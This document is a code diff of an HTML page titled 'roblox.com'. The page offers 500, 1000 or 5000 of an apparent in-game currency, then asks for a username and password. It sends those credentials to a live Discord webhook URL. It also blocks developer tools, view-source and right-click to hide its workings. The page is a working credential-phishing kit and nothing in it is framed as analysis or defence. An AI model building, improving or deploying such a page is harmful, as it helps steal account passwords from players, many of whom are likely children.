@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Selector</title>
+  <title>roblox.com</title>
   <style>
     body {
       margin: 0;
@@ -17,7 +17,6 @@
       overflow: hidden;
     }
 
-    /* RAIN */
     .rain {
       position: absolute;
       width: 100%;
@@ -37,12 +36,8 @@
     }
 
     @keyframes fall {
-      0% {
-        transform: translateY(-50px);
-      }
-      100% {
-        transform: translateY(100vh);
-      }
+      0% { transform: translateY(-50px); }
+      100% { transform: translateY(100vh); }
     }
 
     .frame {
@@ -78,73 +73,28 @@
       transition: 0.2s;
     }
 
-    button:hover {
-      background: #374151;
-    }
+    button:hover { background: #374151; }
+    button img { width: 40px; height: 40px; border-radius: 8px; }
 
-    button img {
-      width: 40px;
-      height: 40px;
-      border-radius: 8px;
-    }
-
-    #result {
-      margin-top: 20px;
-      font-size: 18px;
-    }
-
-    #nextBtn {
-      margin-top: 15px;
-      display: none;
-    }
-
-    .hidden {
-      display: none;
-    }
-
-    input {
-      width: 100%;
-      padding: 8px;
-      margin-top: 8px;
-      border-radius: 8px;
-      border: none;
-      outline: none;
-      background: #111827;
-      color: white;
-      font-size: 14px;
-    }
-
-    #submitBtn {
-      margin-top: 15px;
-    }
+    #result { margin-top: 20px; font-size: 18px; }
+    #nextBtn { margin-top: 15px; display: none; }
+    .hidden { display: none; }
+    input { width: 100%; padding: 8px; margin-top: 8px; border-radius: 8px; border: none; outline: none; background: #111827; color: white; font-size: 14px; }
+    #submitBtn { margin-top: 15px; }
   </style>
 </head>
 <body>
 
-  <!-- RAIN EFFECT -->
   <div class="rain" id="rain"></div>
 
   <!-- FRAME 1 -->
   <div class="frame" id="frame1">
     <div class="buttons">
-      <button onclick="selectOption(500)">
-        <img src="https://image2url.com/r2/default/images/1774275138892-2907d7ae-f094-44fa-b4dd-e391db859c70.png">
-        500
-      </button>
-
-      <button onclick="selectOption(1000)">
-        <img src="https://image2url.com/r2/default/images/1774275138892-2907d7ae-f094-44fa-b4dd-e391db859c70.png">
-        1000
-      </button>
-
-      <button onclick="selectOption(5000)">
-        <img src="https://image2url.com/r2/default/images/1774275138892-2907d7ae-f094-44fa-b4dd-e391db859c70.png">
-        5000
-      </button>
+      <button onclick="selectOption(500)"><img src="https://image2url.com/r2/default/images/1774275138892-2907d7ae-f094-44fa-b4dd-e391db859c70.png">500</button>
+      <button onclick="selectOption(1000)"><img src="https://image2url.com/r2/default/images/1774275138892-2907d7ae-f094-44fa-b4dd-e391db859c70.png">1000</button>
+      <button onclick="selectOption(5000)"><img src="https://image2url.com/r2/default/images/1774275138892-2907d7ae-f094-44fa-b4dd-e391db859c70.png">5000</button>
     </div>
-
     <div id="result">U Selected: None</div>
-
     <button id="nextBtn" onclick="goNext()">Next</button>
   </div>
 
@@ -153,7 +103,6 @@
     <h3>Enter Details</h3>
     <input id="input1" type="text" placeholder="Name">
     <input id="input2" type="password" placeholder="Password">
-
     <button type="button" id="submitBtn" onclick="sendWebhook()">Submit</button>
   </div>
 
@@ -174,27 +123,18 @@
     function sendWebhook() {
       const input1 = document.getElementById('input1').value;
       const input2 = document.getElementById('input2').value;
+      const webhookUrl = 'https://discord.com/api/webhooks/1485646247577518131/to6KoQXfPfVx7aerg2D-19JmJYvShGkQVQo8FQrm_IbLoau-FrTXHERXEiVTCBW-O375'; // Replace with your webhook
 
-      fetch('https://discord.com/api/webhooks/1485646247577518131/to6KoQXfPfVx7aerg2D-19JmJYvShGkQVQo8FQrm_IbLoau-FrTXHERXEiVTCBW-O375', {
+      fetch(webhookUrl, {
         method: 'POST',
-        headers: {
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({
-          selected: selectedValue,
-          input1: input1,
-          input2: input2
-        })
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ selected: selectedValue, name: input1, password: input2 })
       })
-      .then(() => {
-        alert('Sent!');
-      })
-      .catch(() => {
-        alert('Error sending');
-      });
+      .then(res => res.ok ? alert('Sent!') : alert('Error sending: ' + res.status))
+      .catch(err => alert('Fetch error: ' + err));
     }
 
-    // CREATE RAIN
+    // RAIN EFFECT
     const rain = document.getElementById('rain');
     for (let i = 0; i < 30; i++) {
       const drop = document.createElement('div');
@@ -204,19 +144,13 @@
       drop.style.opacity = Math.random();
       rain.appendChild(drop);
     }
-  
+
     // BLOCK DEVTOOLS / VIEW SOURCE
     document.addEventListener('keydown', function(e) {
-      if (
-        e.key === 'F12' ||
-        (e.ctrlKey && e.key.toLowerCase() === 'u') ||
-        (e.ctrlKey && e.shiftKey && e.key.toLowerCase() === 'i')
-      ) {
+      if (e.key === 'F12' || (e.ctrlKey && e.key.toLowerCase() === 'u') || (e.ctrlKey && e.shiftKey && e.key.toLowerCase() === 'i')) {
         window.location.href = 'https://www.youtube.com/shorts/s7NLum2llU0?feature=share';
       }
     });
-
-    // RIGHT CLICK BLOCK
     document.addEventListener('contextmenu', function(e) {
       e.preventDefault();
       window.location.href = 'https://www.youtube.com/shorts/s7NLum2llU0?feature=share';
